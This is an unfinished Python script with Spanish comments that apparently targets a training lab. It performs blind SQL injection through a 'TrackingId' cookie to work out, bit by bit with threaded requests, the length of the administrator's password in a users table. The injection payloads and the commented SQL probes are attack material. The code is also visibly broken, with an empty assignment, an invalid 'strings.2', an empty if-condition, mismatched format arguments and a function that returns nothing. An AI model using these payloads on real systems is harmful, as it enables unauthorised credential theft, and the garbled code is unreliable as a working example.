#!/usr/bin/python3

from pwn import *
import requests
import string
import threading
import signal
import time


def sigint_handler(signal, frame):
    print("\n\n[*] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sigint_handler)

if (len(sys.argv) != 2):
    log.failure("Use: %s <url>" % sys.argv[0])
    sys.exit(1)

url = sys.argv[1]
payload = 
characters = strings.2

# bitwise para saber el len, se calcula por caracter
# case when ord(substr(binary(select length(password) from users where username = 'pepe'),2,1))&1=1 then 1 else 0 end

#select (length(password))&4 from users where username = 'pepe';


# bitwise para saber el len, se calcula con el valor decimal del string resultante de len
#select case when ord(binary(select length(password) from users where username = 'pepe'))&1=1 then 1 else 0 end;

def checkLengthPayloadBuild(column_name, table_name, conditional_key, conditional_value):
    payload = "' and case when ord(binary(select length(%s) from %s where %s = \'%s\'))%d=%d then 1 else 0 end -- -" %(column_name, table_name, conditional_key, conditional_value)  
    return payload

def makeRequest(s, url, injection, bits_array):
    s.cookies.set('TrackingId', None)
    s.cookies.set('TrackingId', injection)
    r = s.get(url)
    if ():
        bits_array.append((bit,1))
    else:
        bits_array.append((bit,0))

def buildLength(bits_array):
    bits_sorted_by_position = sorted(bits_array, key=lambda tup: tup[0])


def checkLength(s, column_name, table_name, conditional_key, conditional_value, url):
    bits = [1,2,4,8,16,32,64,128]
    cookies_init = s.cookies.get_dict()
    trackingIdCookie = cookies_init['TrackingId']
    bits_array = []
    threads = []
    for bit in bits:
        payload = "' and case when ord(binary(select length(%s) from %s where %s = \'%s\'))%d=%d then 1 else 0 end -- -" %(column_name, table_name, conditional_key, conditional_value, bit, bit)  
        injection = trackingIdCookie + payload
        thread = threading.Thread(target=makeRequest, args=(s, url, injection, bits_array))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    return buildLength(bits_array)

def main():
    p1 = log.progress("Brute force")
    p2 = log.progress("Password")
    p1.status("Initialize")
    time.sleep(2)
    s = requests.Session()
    request_inicial = s.get(url)
    cookies_init = s.cookies.get_dict()
    trackingIdCookie = cookies_init['TrackingId']
    request_inicial = s.get(url)

    check_length_payload = checkLengthPayloadBuild('password','users','username','administrator')
    length_password = checkLength(s, 'password','users','username','administrator')
    
if __name__ == "__main__":
    main()
